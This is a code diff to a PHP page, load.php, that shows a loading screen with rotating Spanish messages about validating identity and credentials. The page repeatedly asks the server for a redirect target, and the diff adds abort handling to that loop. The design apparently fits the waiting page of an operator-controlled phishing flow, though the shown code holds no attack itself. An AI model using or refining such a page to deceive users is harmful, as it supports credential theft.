@@ -393,58 +393,72 @@ if (isset($_GET['check'])) {
     </div>
 
     <script>
-        // Array de mensajes dinámicos
-        const mensajes = [
-            'Validando Identidad',
-            'Verificando Datos',
-            'Procesando Solicitud',
-            'Autenticando Usuario',
-            'Validando Información'
-        ];
+    // Array de mensajes dinámicos
+    const mensajes = [
+        'Validando Identidad',
+        'Verificando Datos',
+        'Procesando Solicitud',
+        'Autenticando Usuario',
+        'Validando Información'
+    ];
+    const subtitulos = [
+        'Autenticando credenciales',
+        'Verificando información',
+        'Procesando solicitud',
+        'Finalizando validación',
+        'Cargando datos'
+    ];
+    let indiceActual = 0;
 
-        const subtitulos = [
-            'Autenticando credenciales',
-            'Verificando información',
-            'Procesando solicitud',
-            'Finalizando validación',
-            'Cargando datos'
-        ];
+    function cambiarTitulo() {
+        const titulo = document.getElementById('dynamicTitle');
+        const subtitulo = document.getElementById('statusSubtext');
+        titulo.style.animation = 'none';
+        setTimeout(() => {
+            titulo.textContent = mensajes[indiceActual];
+            subtitulo.textContent = subtitulos[indiceActual];
+            titulo.style.animation = 'fadeInOut 0.6s ease-in-out';
+            indiceActual = (indiceActual + 1) % mensajes.length;
+        }, 50);
+    }
+    setInterval(cambiarTitulo, 5000);
 
-        let indiceActual = 0;
+    // ── Control de polling ──
+    let isChecking = false;       // evita llamadas concurrentes
+    let controller = null;        // AbortController activo
+    let redirectFound = false;    // detiene el loop al redirigir
 
-        // Cambiar título dinámicamente
-        function cambiarTitulo() {
-            const titulo = document.getElementById('dynamicTitle');
-            const subtitulo = document.getElementById('statusSubtext');
-            
-            titulo.style.animation = 'none';
-            
-            setTimeout(() => {
-                titulo.textContent = mensajes[indiceActual];
-                subtitulo.textContent = subtitulos[indiceActual];
-                titulo.style.animation = 'fadeInOut 0.6s ease-in-out';
-                indiceActual = (indiceActual + 1) % mensajes.length;
-            }, 50);
-        }
+    function checkRedirect() {
+        if (isChecking || redirectFound) return;
+        isChecking = true;
 
-        // Cambiar título cada 5 segundos
-        setInterval(cambiarTitulo, 5000);
+        // Cancelar fetch anterior si aún sigue en vuelo
+        if (controller) controller.abort();
+        controller = new AbortController();
 
-        // Redireccionamiento backend
-        function checkRedirect() {
-            fetch('load.php?id=<?php echo htmlspecialchars($request_id ?? "", ENT_QUOTES, "UTF-8"); ?>&check=1')
-                .then(res => res.json())
-                .then(data => {
-                    if (data.redirect) {
-                        window.location.href = data.redirect;
-                    } else {
-                        setTimeout(checkRedirect, 1500);
-                    }
-                })
-                .catch(() => setTimeout(checkRedirect, 1500));
-        }
+        fetch('load.php?id=<?php echo htmlspecialchars($request_id ?? "", ENT_QUOTES, "UTF-8"); ?>&check=1', {
+            signal: controller.signal
+        })
+            .then(res => res.json())
+            .then(data => {
+                isChecking = false;
+                if (data.redirect) {
+                    redirectFound = true;
+                    window.location.href = data.redirect;
+                } else {
+                    setTimeout(checkRedirect, 1500);
+                }
+            })
+            .catch(err => {
+                isChecking = false;
+                // Solo reintentar si NO fue un abort intencional
+                if (err.name !== 'AbortError') {
+                    setTimeout(checkRedirect, 1500);
+                }
+            });
+    }
 
-        window.onload = checkRedirect;
-    </script>
+    window.onload = checkRedirect;
+</script>
 </body>
 </html>
